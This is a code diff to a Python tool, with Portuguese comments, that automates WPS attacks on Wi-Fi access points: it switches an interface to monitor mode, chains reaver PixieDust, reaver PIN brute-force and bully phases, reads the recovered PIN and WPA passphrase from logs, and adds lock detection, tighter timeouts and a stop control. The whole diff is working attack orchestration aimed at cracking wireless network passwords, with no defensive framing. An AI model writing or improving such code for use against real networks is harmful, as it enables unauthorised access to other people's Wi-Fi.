@@ -611,9 +611,13 @@ def _kill_proc(p):
             except Exception:
                 pass
 
-# ---------------- WPS attack (reaver PixieDust + PIN) ----------------
+# ---------------- WPS attack (reaver PixieDust + PIN + bully) ----------------
 _wps = {"proc": None, "log": f"{WORK}/wps.log", "bssid": None, "iface": None,
-        "fase": None, "ch": None, "essid": None}
+        "fase": None, "ch": None, "essid": None, "parar": False, "msg": None}
+
+# timeouts curtos: WPS em campo resolve rapido (pixie) ou nao resolve. PIN brute
+# completo e inviavel (AP trava), entao a deteccao de lock aborta antes do limite.
+_WPS_LIMITE = {"pixie": 150, "pin": 180, "bully": 180}
 
 
 def _wps_log_tail(n=40):
@@ -638,6 +642,13 @@ def _wps_parse():
     return pin, psk, done
 
 
+def _wps_locked(txt):
+    """AP travou o WPS (rate limiting / lock) - nao adianta insistir nessa fase."""
+    low = txt.lower()
+    return ("rate limiting" in low or "wps lock" in low
+            or "ap is locked" in low or "detected ap rate" in low)
+
+
 def _wps_cmd(iface, bssid, ch, fase):
     c = ("-c %d " % int(ch)) if ch else ""
     if fase == "pixie":
@@ -652,6 +663,10 @@ def _wps_cmd(iface, bssid, ch, fase):
 
 
 def _wps_run_fase(fase):
+    if fase == "bully" and not _which("bully"):
+        with open(_wps["log"], "a", errors="replace") as f:
+            f.write("\n[fase bully pulada: bully nao instalado]\n")
+        return False
     cmd = _wps_cmd(_wps["iface"], _wps["bssid"], _wps["ch"], fase)
     if not cmd:
         return False
@@ -660,16 +675,22 @@ def _wps_run_fase(fase):
         f.write("\n=== fase: %s ===\n" % fase)
     _wps["proc"] = subprocess.Popen(cmd + " >> %s 2>&1" % _wps["log"],
                                     shell=True, preexec_fn=os.setsid)
-    limite = {"pixie": 180, "pin": 900, "bully": 600}.get(fase, 300)
+    limite = _WPS_LIMITE.get(fase, 180)
     t0 = time.time()
     while _wps["proc"].poll() is None:
-        if time.time() - t0 > limite:
+        if _wps["parar"] or time.time() - t0 > limite:
             _kill_proc(_wps["proc"])
             break
         pin, psk, done = _wps_parse()
         if done:
             _kill_proc(_wps["proc"])
             return True
+        if _wps_locked(_wps_log_tail(80)):
+            _kill_proc(_wps["proc"])
+            with open(_wps["log"], "a", errors="replace") as f:
+                f.write("\n[-] AP travou o WPS (rate limiting/lock) - abortando fase %s\n" % fase)
+            _wps["msg"] = "AP travou o WPS (lock/rate limiting)"
+            break
         time.sleep(2)
     pin, psk, done = _wps_parse()
     return done
@@ -677,10 +698,13 @@ def _wps_run_fase(fase):
 
 def _wps_orquestra():
     for fase in ("pixie", "pin", "bully"):
+        if _wps["parar"]:
+            break
         if _wps_run_fase(fase):
             return
-    with open(_wps["log"], "a", errors="replace") as f:
-        f.write("\n[-] todas as fases falharam (AP pode ter WPS desabilitado/lock)\n")
+    if not _wps["parar"]:
+        with open(_wps["log"], "a", errors="replace") as f:
+            f.write("\n[-] todas as fases terminaram sem achar o PIN/PSK\n")
 
 
 def wps_attack_start(bssid, channel, iface=None, essid=None):
@@ -696,15 +720,13 @@ def wps_attack_start(bssid, channel, iface=None, essid=None):
     except OSError:
         pass
     _set_monitor(iface)
-    _wps["bssid"] = bssid
-    _wps["iface"] = iface
-    _wps["ch"] = channel
-    _wps["essid"] = essid
-    _wps["fase"] = "pixie"
+    _wps.update({"bssid": bssid, "iface": iface, "ch": channel, "essid": essid,
+                 "fase": "pixie", "parar": False, "msg": None})
     import threading
     t = threading.Thread(target=_wps_orquestra, daemon=True)
     t.start()
-    return {"ok": True, "msg": "ataque WPS iniciado (PixieDust -> PIN -> bully)",
+    fases = "PixieDust -> PIN" + (" -> bully" if _which("bully") else "")
+    return {"ok": True, "msg": "ataque WPS iniciado (%s)" % fases,
             "bssid": bssid, "iface": iface}
 
 
@@ -713,10 +735,11 @@ def wps_attack_status():
     pin, psk, done = _wps_parse()
     return {"ok": True, "rodando": running, "pin": pin, "psk": psk,
             "sucesso": done, "bssid": _wps["bssid"], "fase": _wps["fase"],
-            "log": _wps_log_tail(30)}
+            "aviso": _wps.get("msg"), "log": _wps_log_tail(30)}
 
 
 def wps_attack_stop():
+    _wps["parar"] = True
     _kill_proc(_wps["proc"])
     _wps["proc"] = None
     _wps["fase"] = None
